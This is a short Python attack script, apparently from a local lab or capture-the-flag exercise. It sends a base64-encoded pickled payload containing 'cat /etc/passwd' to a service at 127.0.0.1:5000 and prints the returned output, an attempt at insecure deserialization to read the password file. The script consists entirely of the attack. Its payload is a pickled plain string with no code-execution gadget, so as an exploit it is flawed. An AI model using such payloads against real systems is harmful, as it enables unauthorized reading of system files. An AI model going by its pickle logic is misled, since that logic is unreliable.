import pickle
import base64
import requests
from time import sleep
from bs4 import BeautifulSoup

def evil():
    return base64.b64encode(pickle.dumps('cat /etc/passwd'))


result = requests.post("http://127.0.0.1:5000", data = {"data" : evil()})

if result.status_code == 200:

    soup = BeautifulSoup(result.text, 'html.parser')

    pre_text = soup.find('pre')
    
    print(pre_text)

else :
    print ("sa marche pas")
